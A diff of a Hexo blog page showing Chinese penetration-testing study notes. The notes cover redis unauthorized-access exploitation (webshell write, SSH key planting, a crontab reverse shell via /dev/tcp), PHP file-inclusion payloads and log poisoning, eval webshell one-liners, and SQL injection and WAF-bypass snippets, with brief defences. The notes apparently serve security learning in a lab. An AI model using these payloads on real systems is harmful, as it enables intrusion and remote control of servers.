@@ -1,761 +1,1325 @@
 <!DOCTYPE html>
-<html lang="en">
-
-<!-- Head tag -->
+<html>
 <head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="">
-    <meta name="keyword" content="">
-    <meta name="theme-color" content="#600090">
-    <meta name="msapplication-navbutton-color" content="#600090">
-    <meta name="apple-mobile-web-app-capable" content="yes">
-    <meta name="apple-mobile-web-app-status-bar-style" content="#600090">
-    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
-    <link rel="alternate" type="application/atom+xml" title="pengpengp&#39;s BLOG" href="/atom.xml">
-    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
-    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.css">
-    <title>
-        
-        
-        
-    </title>
+  <meta charset="utf-8">
+  
 
-    <link rel="canonical" href="https://pengpengp.github.io/page/2/">
-
-    <!-- Bootstrap Core CSS -->
-    
-<link rel="stylesheet" href="/css/bootstrap.min.css">
-
-
-    <!-- Custom CSS -->
-    
-<link rel="stylesheet" href="/css/blog-style.css">
-
-
-    <!-- Pygments Github CSS -->
-    
-<link rel="stylesheet" href="/css/syntax.css">
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
 <meta name="generator" content="Hexo 5.2.0"></head>
 
-<style>
-
-    header.intro-header {
-        background-image: url('')
-    }
-</style>
-<!-- hack iOS CSS :active style -->
-<body ontouchstart="" class="animated fadeIn">
-<!-- Navigation -->
-<nav class="navbar navbar-default navbar-custom navbar-fixed-top " id="nav-top" data-ispost = "false" data-istags="false
-" data-ishome = "true" >
-    <div class="container-fluid">
-        <!-- Brand and toggle get grouped for better mobile display -->
-        <div class="navbar-header page-scroll">
-            <button type="button" class="navbar-toggle">
-                <span class="sr-only">Toggle navigation</span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-                <span class="icon-bar"></span>
-            </button>
-            <a class="navbar-brand animated pulse" href="/">
-                <span class="brand-logo">
-                    pengpengp&#39;s BLOG
-                </span>
-                's Blog
-            </a>
-        </div>
-
-        <!-- Collect the nav links, forms, and other content for toggling -->
-        <!-- Known Issue, found by Hux:
-            <nav>'s height woule be hold on by its content.
-            so, when navbar scale out, the <nav> will cover tags.
-            also mask any touch event of tags, unfortunately.
-        -->
-        <!-- /.navbar-collapse -->
-        <div id="huxblog_navbar">
-            <div class="navbar-collapse">
-                <ul class="nav navbar-nav navbar-right">
-                    <li>
-                        <a href="/">Home</a>
-                    </li>
-					
-                    
-					
-					
-                </ul>
-            </div>
-        </div>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
     </div>
-    <!-- /.container -->
-</nav>
-<script>
-    // Drop Bootstarp low-performance Navbar
-    // Use customize navbar with high-quality material design animation
-    // in high-perf jank-free CSS3 implementation
-//    var $body   = document.body;
-    var $toggle = document.querySelector('.navbar-toggle');
-    var $navbar = document.querySelector('#huxblog_navbar');
-    var $collapse = document.querySelector('.navbar-collapse');
-
-    $toggle.addEventListener('click', handleMagic)
-    function handleMagic(e){
-        if ($navbar.className.indexOf('in') > 0) {
-        // CLOSE
-            $navbar.className = " ";
-            // wait until animation end.
-            setTimeout(function(){
-                // prevent frequently toggle
-                if($navbar.className.indexOf('in') < 0) {
-                    $collapse.style.height = "0px"
-                }
-            },400)
-        }else{
-        // OPEN
-            $collapse.style.height = "auto"
-            $navbar.className += " in";
-        }
-    }
-</script>
-
-<!-- Main Content -->
-
-
-<style>
-
-    .custom-haojen-container .post-preview:nth-of-type(1),
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) {
-        text-align: center;
-        background-repeat: no-repeat;
-        border-radius: 3px;
-        background-size: cover;
-        padding: 0;
-        height: 300px;
-        display: table;
-        width: 100%;
-        background-color: rgba(0, 0, 0, 0.16);
-    }
-
-    /*去掉诗歌的背景图片*/
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) {
-        background-image: none !important;
-        background-color: rgba(255, 248, 220, 0.5);
-    }
-
-    .custom-haojen-container .post-preview:nth-child(1) h2,
-    .custom-haojen-container .post-preview:nth-child(1) .post-meta,
-    .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-        text-shadow: 0 0 40px rgba(0, 0, 0, 1);
-        letter-spacing: 1px;
-        color: #fff;
-        margin-top: 0;
-        padding-left: 60px;
-        padding-right: 60px;
-    }
-
-    .custom-haojen-container .post-preview:nth-child(1) .post-meta {
-        font-size: .9em;
-        font-weight: 300;
-        margin-top: 0;
-    }
-
-    .custom-haojen-container .post-preview-poetry:nth-child(1) .post-subtitle {
-        letter-spacing: 6px;
-        font-size: 18px;
-        font-family: unset;
-        font-weight: 400;
-        color: rgba(0, 0, 0, .75)
-    }
-
-    /*不显示摘要*/
-    .custom-haojen-container .post-preview:nth-child(1) .post-content-preview {
-        display: none
-    }
-
-    /*只第一个显示背景图片*/
-    .custom-haojen-container .post-preview:not(:nth-child(1)) {
-        background-image: none !important;
-    }
-
-    /*第一个分界线去掉*/
-    .custom-haojen-container hr:nth-of-type(1) {
-        display: none;
-    }
-
-    /*主题*/
-    .custom-haojen-container .post-preview:nth-of-type(1) > a {
-        display: table-cell;
-        vertical-align: middle;
-    }
-
-    /*诗词标题*/
-    .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-        font-size: 35px;
-        font-family: STKaiti;
-        color: rgba(0, 0, 0, .8);
-    }
-
-    .custom-haojen-container .post-preview-poetry:nth-of-type(1) .post-meta {
-        color: #0e2231;
-    }
-
-    @media (max-width: 768px) {
-        .custom-haojen-container .post-preview:nth-child(1) {
-            height: 240px;
-        }
-
-        .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-            font-size: 28px !important;
-            margin-top: 0;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-            font-size: 18px;
-            font-weight: 400;
-            padding-left: 0;
-            padding-right: 0;
-        }
-
-        .custom-haojen-container .post-preview:nth-of-type(1) > a {
-            padding: 20px
-        }
-    }
-
-    /*手机屏幕*/
-    @media (max-width: 400px) {
-        .custom-haojen-container .post-preview:nth-child(1) {
-            height: 195px;
-        }
-
-        .custom-haojen-container .post-preview-poetry:nth-child(1) h2 {
-            font-size: 20px !important;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) .post-subtitle {
-            font-size: 16px;
-        }
-
-        .custom-haojen-container .post-preview:nth-child(1) a {
-            padding: 30px 20px;
-        }
-    }
-</style>
-
-<!-- Page Header -->
-<div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 visible-xs-block visible-sm-block">
-    <div class="row">
-        <header class="intro-header">
-            <div class="container">
-                <div class="site-heading text-center">
-                    <div class="about-me">
-                        <!--移动端头部显示-->
-                        <img src=""/>
-                        <h5><a href="/about/">pengpengp</a></h5>
-                        <p></p>
-                    </div>
-                </div>
-            </div>
-        </header>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
     </div>
-</div>
-<!-- Main Content -->
-<div class="container custom-haojen-container">
-    <!-- Post Container -->
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-1 col-md-8 col-md-offset-1 col-sm-12 col-xs-12 post-container">
-            <!-- Main Content -->
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/02/17/文件包含/">
-        <h2 class="post-title">
-            文件包含
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-02-17
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-一.相关的四个函数：
-
-include “$path”    出错继续执行
-require        出错终止
-include once()    只能包含一次
-require once()
-
-
-二.本地文件包含：
-
-​    include($_GET[‘abc’])        然后..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/01/16/shell-rebound/">
-        <h2 class="post-title">
-            shell_rebound
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-16
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-命令执行漏洞eval=($_POST[&#39;eval&#39;])
-
-特点：能直接执行命令，也就直接能菜刀连接。计算器执行任意命令漏洞：一般需要代码审计才能找到
-
-连接蚁剑得方法：
-
-在请求信息里添加name=eval;value=1，eval($_POST[1])
-
-菜刀得连接方法：配置..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/01/15/cross-waf/">
-        <h2 class="post-title">
-            cross_waf
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-15
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                三种waf
-代码waf    云waf    物理waf
-绕过waf的方式：
-1.大小写混合2.替换关键字selselectect 1,2,3,43.使用编码%554.使用注释 union/**/select 1,2,4,5.特殊符号6.等价函数    @@user=user()7.HTTP参数..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/01/13/file-update/">
-        <h2 class="post-title">
-            'file_update'
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-13
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-文件上传一：    漏洞原理及三个测试点
-
-一.问题：服务器中webshell怎么运行
-lamp环境要求：apache nginx iis tomcat
-1.路径要求   脚本必须在/var/www/html中
-2.后缀名要求    .php .asp
-二. 上传漏洞
-1.哪里会产生漏洞：相册..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2019/01/04/sql-inject-advance/">
-        <h2 class="post-title">
-            sql_注入进阶
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2019-01-04
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-基于时间延时的盲注
-
-
-一. 基于时间延时的盲注
-
-​        select sleep(5)；等待五秒，返回值是0***
-​        select if(arg1,arg2,arg3);判断返回值的真假
-​        select benchmark(50000,md5(&#..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2018/12/28/sql-inject-Process/">
-        <h2 class="post-title">
-            'sql_inject_Process'
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-12-28
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-留言板安全问题
-
-用户名root &#39; or 1 = 1#    密码1    –&gt;万能密码注入
-
-原理：
-
-​    SELECT * FROM users WHERE username=’$user’ AND passwd =’”.md5($pwd).被变成
-select * ..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2018/12/28/sql-inject/">
-        <h2 class="post-title">
-            'sql_inject'
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-12-28
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                
-流程：
-
-
-1.前期沟通
-
-
-2.信息搜集（四五天）
-
-
-3.威胁建模：根据信息进行分析攻击点（一天）
-
-
-4.渗透测试：根据分析进行攻击
-
-
-5.后渗透测试：根据测试结果进行更多尝试
-
-
-6.写报告
-
-​    
-    www.exploit-db.com
-    https://www...
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2018/12/26/Create-VPN/">
-        <h2 class="post-title">
-            Create_VPN
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-12-26
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                创建VPN连接
-一.安装浏览器插件    hackbar、Header Edit、wappalzer、 proxy、server ip
-二.在windows 2008上搭建vpn
-搭建PPTP连接
-
-1.打开服务管理器—&gt;添加角色—-&gt;勾选“网络策略和访问服务 ”——&gt;下一步—..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2018/12/24/http-request/">
-        <h2 class="post-title">
-            http_request 
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-12-24
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                *** 一.http基础：
-
-URL：http://admin:123@www.baidu.com：80/new/index.php？id=1#  *协议  + http基础认证  +域名     +端口  +路径  +文件名  +参数  +锚部分
-
-URL编码****
-  ‘’    --%2..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview "
-     style="background-image: url('')">
-    <a href="/2018/12/23/PHP-useage/">
-        <h2 class="post-title">
-            PHP_useage
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-12-23
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                *** php用法 ***
-文件包含    include(‘文件名’)    require(‘文件名’)
-
-用法1.包含头信息—每个页面头部都是一样的
-
-用法2.包含账号密码的配置文件
-
-用法3.包含远程文件  include “http://www.baidu.com&quot;;
-
-
-注..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-
-<!-- 翻页 pager -->
-
-<ul class="pager">
+  </div>
+</header>
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-redis未授权漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/18/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2019-02-18T12:41:09.000Z" itemprop="datePublished">2019-02-18</time>
+</a>
     
-    <li class="previous">
-        <a href="/">&larr; Newer Posts</a>
-    </li>
+  </div>
+  <div class="article-inner">
     
     
-    <li class="next">
-        <a href="/page/3/">Older Posts &rarr;</a>
-    </li>
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/18/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/">redis未授权漏洞</a>
+    </h1>
+  
+
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"><a href="#原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件" class="headerlink" title="原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件"></a>原理：利用redis高权限免密登陆的特性，向目标机器保存数据库文件</h3><h3 id="利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"><a href="#利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等" class="headerlink" title="利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等"></a>利用：redis漏洞可以向目标机器写文件，饶过密码连接，反弹shell等</h3><h3 id="防御：限制redis权限"><a href="#防御：限制redis权限" class="headerlink" title="防御：限制redis权限"></a>防御：限制redis权限</h3><h1 id="一。-数据库原理：redis数据库-临时存储数据库"><a href="#一。-数据库原理：redis数据库-临时存储数据库" class="headerlink" title="一。 数据库原理：redis数据库(临时存储数据库)"></a>一。 数据库原理：redis数据库(临时存储数据库)</h1><pre><code>下载redis文件
+
+解压，`make --&gt;cd src make--&gt; install`
+
+启动:`redis-server`
+
+进入：令开个连接:`redis-cli`</code></pre>
+<ul>
+<li><p>redis特点：数据在文件中存储  ,默认root权限(低权限时会无权限写日志导致启动失败)，6379端口无密码</p>
+</li>
+<li><p>利用redis数据库创建任意文件方法：</p>
+<pre><code>    1.设置数据库文件存储路径：    `config set dir ./`</code></pre>
+<p>​        2.设置数据库文件名称:<code>config set dbfilename zs</code></p>
+<p>​        3.设置键和值：<code>set name &quot;zs&quot;</code></p>
+<p>​        4.保存：<code>save</code></p>
+<p>​        5.在目录下就有一个zs文件     </p>
+</li>
+<li><p>实验：利用redis漏洞做webshell</p>
+<p>步骤：        </p>
+<p>​        1.<code>config set dir /var/www/html/</code><br>​        2.<code>config set dbfilename 404.php</code><br>​        3.<code>set name &quot;&lt;?php phpinfo()?&gt;&quot;</code><br>​        4.<code>save</code><br>​        5.在浏览器访问ip/404.php即可执行phpinfo 命令</p>
+</li>
+<li><p>常用命令：</p>
+<pre><code>    info查看信息
+    get/set
+        FLUSHALL：清空键值
+        get 键：获取值
+        config get dir：获取路径
+        config get dbfilename：获取文件名</code></pre>
+<hr>
+<hr>
+</li>
+</ul>
+<h1 id="二。redis利用未授权漏洞ssh免密码登陆："><a href="#二。redis利用未授权漏洞ssh免密码登陆：" class="headerlink" title="二。redis利用未授权漏洞ssh免密码登陆："></a>二。redis利用未授权漏洞ssh免密码登陆：</h1><p>​                1.cat authorized_keys：秘钥内容<br>​                    2.FlUSHALL<br>​                    3.config set dir /root/.ssh<br>​                    4.config set dbfilename authorized_keys<br>​                    5.set sshkey “\n\n\n内容\n\n\n”        //换行符保证字符串分隔开<br>​                    6.save<br>​<br>​    条件：/etc/ssh/sshd_config |grep key –&gt;pubkeyAuthentication_keys 开启，即需要ssh先免密钥登陆一次</p>
+<ul>
+<li>流程：找到开放的6379端口：    <pre><code>    1.redis-cli -h ip 连接远程服务器redis
+    2.执行info能否成功
+    3.用config set dir /root看看是不是root权限
+    4.config set dir /root/.ssh
+    5.config set dbfilename authorized_keys
+    6.set sshkey &quot;\n\n\n公钥\n\n\n&quot;
+    7.save</code></pre>
+</li>
+</ul>
+<p>  ​    连接：把私钥保存成文件<br>  ​        ssh -i 私钥文件  <a href="mailto:&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#x31;&#x2e;&#x38;&#52;">&#114;&#x6f;&#x6f;&#116;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#46;&#49;&#x31;&#x2e;&#x38;&#52;</a></p>
+<hr>
+<hr>
+<h1 id="三。计划任务漏洞："><a href="#三。计划任务漏洞：" class="headerlink" title="三。计划任务漏洞："></a>三。计划任务漏洞：</h1><p>​    计划任务：<br>​            crontab -l 查看计划任务ss<br>​            `* * * * * echo ‘date\nhello!’&gt;&gt;/tmp/email``</p>
+<p>​        ``* * * * <em><code>代表分时日月周 ​        例子 :    </code></em> 8 */1 * * 命令`：每天八点执行命令<br>​                添加任务：crontab -e进入编辑模式,</p>
+<p>​            查看添加的任务：cat   /vat/spool/cron/root  //root是指用户    //小技巧：tail -f 文件   滚动刷新</p>
+<p>​            </p>
+<p>*<em>练习：每分钟反弹shell到我的电脑**</em><br>        1.用redis进行登陆：redis-cli -h ip<br>        2.<code>info</code>查看能否执行<br>        3.用<code>config set dir /root</code>看看是不是root权限<br>        4.<code>config set dir /var/spool/cron/</code><br>        5.<code>config set dbfilename root</code><br>        6.<code>set name    &quot;\n*/1 * * * *     bash -i &gt;&amp; /dev/tcp/IP地址/监听端口 0&gt;&amp;1\n&quot;</code><br>        7.<code>save</code><br>        8.本地nc中 <code>nc -lnvp40000</code> 开始监听</p>
+<p>遇到windows+redis的情况：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/170360">https://www.anquanke.com/post/id/170360</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/02/18/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E/" data-id="ckgg5oe0q000pzov296g7dfea" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis%E6%BC%8F%E6%B4%9E-%E4%B8%80%E8%88%AC%E5%86%85%E7%BD%91%EF%BC%89/" rel="tag">redis漏洞(一般内网）</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-文件包含" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/02/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" class="article-date">
+  <time datetime="2019-02-17T08:09:48.000Z" itemprop="datePublished">2019-02-17</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/02/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>一.相关的四个函数：</p>
+</blockquote>
+<p>include “$path”    出错继续执行</p>
+<p>require        出错终止</p>
+<p>include once()    只能包含一次</p>
+<p>require once()</p>
+<hr>
+<blockquote>
+<p>二.本地文件包含：</p>
+</blockquote>
+<p>​    include($_GET[‘abc’])<br>        然后在地址栏给abc传入一个值 ../../../就可以随意读取目录的文件</p>
+<hr>
+<blockquote>
+<p>三.远程文件包含：</p>
+</blockquote>
+<p>​        限制条件：php.ini文件中<br>        allow_url_include=on</p>
+<p>​    在一个安全的路径下运行cmd命令：<br>        php -S 0.0.0.0:6000就会打开一个apache服务器<br>        此时用浏览器可以访问（php5.6以上才带apache）</p>
+<p>最终目的是菜刀连接</p>
+<hr>
+<blockquote>
+<p>四. 文件包含配合文件上传漏洞：结合图片马或结合日志</p>
+</blockquote>
+<p>​    先上传一张图片马，再用文件包含漏洞去执行图片使菜单可执行，然后就可以用工具连接了</p>
+<hr>
+<blockquote>
+<p>五.文件包含的意义：使图片可被执行</p>
+</blockquote>
+<hr>
+<blockquote>
+<p>六.怎么找到文件包含漏洞：</p>
+</blockquote>
+<p>​        谷歌：inurl:?include=</p>
+<hr>
+<blockquote>
+<p>七.文件包含漏洞.结合日志    /var/log/httpd/access_log</p>
+</blockquote>
+<p>​        写入日志文件：<br>        <a target="_blank" rel="noopener" href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/%3C?php%20echo%27789%27?%3E</a></p>
+<p>​    查看（需要权限）<a target="_blank" rel="noopener" href="http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log">http://192.168.11.148/index.php?path=../../../../../../../var/log/httpd/access_log</a></p>
+<p>​    然后可以用菜刀连</p>
+<hr>
+<blockquote>
+<p>八.iis文件包含</p>
+</blockquote>
+<p>​        目录：<code>C:\inetpub\logs\LogFiles\W3SVC3</code></p>
+<hr>
+<blockquote>
+<p>九.本地文件包含截断</p>
+</blockquote>
+<p>​    本地常见模板：<?php include("inc/" . $_GET['file'] . ".htm"); ?> </p>
+<p>​    1.绕过方法(转)：%00截断<br>        /etc/passwd%00<br>        (需要 magic_quotes_gpc=off，PHP小于5.3.4有效)</p>
+<p>​    2.%00截断目录遍历：<br>        /var/www/%00<br>        (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris)</p>
+<p>​    3.路径长度截断：<br>        /etc/passwd/././././././.[…]/./././././.<br>        (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256)</p>
+<p>​    4.点号截断：<br>        /boot.ini/………[…]…………<br>        (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256)</p>
+<hr>
+<blockquote>
+<p>十.伪协议</p>
+</blockquote>
+<ul>
+<li><p>常用伪协议的使用：</p>
+<p> file://</p>
+<pre><code> php://filter        ---用来读文件
+
+ http://
+
+ ftp://
+
+ php://input        ---用来读post数据
+
+ data://text/plain,1    ---用来修改读取的数据为1</code></pre>
+</li>
+<li><p>综合前提：</p>
+<p> open_basedir</p>
+<p> include $_GET[]能用所有伪协议<br> include $_GET[].”.inc”能用http伪协议，其他形式都用不了伪协议</p>
+<p>  具体使用：</p>
+</li>
+</ul>
+<p>   -&gt;1.file://的使用</p>
+   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">条件：allow_url_fopen  on&#x2F;off</span><br><span class="line">allow_url_include on&#x2F;off这两条不限制</span><br></pre></td></tr></table></figure>
+
+<p>   ​<br>   使用：<code>http://www.ad.com/include.php?path=file://c:\aa.txt</code></p>
+<p>   -&gt;2.php://filter用法：前面部分是固定的</p>
+<pre><code>    `php://filter/read/convert.base64-encode/resource=路径+文件名`
+
+得到加密的代码，用base64解码既可以得到php文件内容    </code></pre>
+<p>​    </p>
+<p>​    -&gt;3.php://input的条件及使用</p>
+<p>​    条件：allow_url_include  on   远程文件包含开启</p>
+<p>使用：<br>    地址栏为：<code>include.php?path=php://input</code><br>    然后post发包：    <code>&lt;?php phpinfo();?&gt;</code>（post写要执行的php内容就可以被执行）<br>    写一句话的方法： <code>file_put_contents(&lt;?php eval($_POST[&#39;pass&#39;])?&gt;)</code></p>
+<p>​    </p>
+<p>​    -&gt;4.data://使用</p>
+<p>​    条件 allow_url_fopen on<br>    allow_url_include   on</p>
+<p>使用：<code>file=data://text/plain,&lt;?php phpinfo();?&gt;</code><br>    或者转为base64:<code>file=data://text/plain;base64,Kjmx()9wadalniaqfhq9fHQ9fh</code></p>
+<p>题外:判断access还是sql server数据库：<br>        <code>and exists(select count(*) from sysobjects;)</code><br>        sysobjects库只有sql server有</p>
+<p><a target="_blank" rel="noopener" href="http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php">http://192.168.11.72/?a=data://text/plain,1&amp;b=1&amp;e=data://text/plain,I%27m%20Administrator!&amp;c=php://filter/convert.base64-encode/resource=index.php</a></p>
+<hr>
+<blockquote>
+<p>十一. 防御方法：</p>
+</blockquote>
+<p>1.php.ini中open_basedir=www目录：限制只能打开指定路径的文件</p>
+<p>2.限制接收的变量内容</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2019/02/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-id="ckgg5oe10001hzov262vidheb" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" rel="tag">文件包含漏洞</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-shell-rebound" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/01/16/shell-rebound/" class="article-date">
+  <time datetime="2019-01-16T11:09:35.000Z" itemprop="datePublished">2019-01-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/01/16/shell-rebound/">shell_rebound</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <ul>
+<li>命令执行漏洞<code>eval=($_POST[&#39;eval&#39;])</code></li>
+</ul>
+<p>特点：能直接执行命令，也就直接能菜刀连接。计算器执行任意命令漏洞：一般需要代码审计才能找到</p>
+<ul>
+<li>连接蚁剑得方法：</li>
+</ul>
+<p>在请求信息里添加<code>name=eval;value=1，eval($_POST[1])</code></p>
+<ul>
+<li>菜刀得连接方法：配置项中加入<code>&lt;O&gt;eval=1;eval($_POST[1])&lt;/O&gt;</code></li>
+</ul>
+<ul>
+<li><p>代码执行：</p>
+<p>system()命令</p>
+</li>
+</ul>
+<p>​    举例system(‘ping’.$ip)</p>
+<p>同时执行两条命令：<br>    windows：&amp;、&amp;&amp;、||<br>    linux：；分号、&amp;&amp;、||</p>
+<ul>
+<li>注意：````反引号在linux中可以执行  ping <code>whoami</code>    ```</li>
+</ul>
+<p>windows中如果容器不是iis的，（tamcat\apache等）权限都比较高，<br>linux中只有tomcat可能是root权限</p>
+<blockquote>
+<p>控制shell的方法：bash -i</p>
+</blockquote>
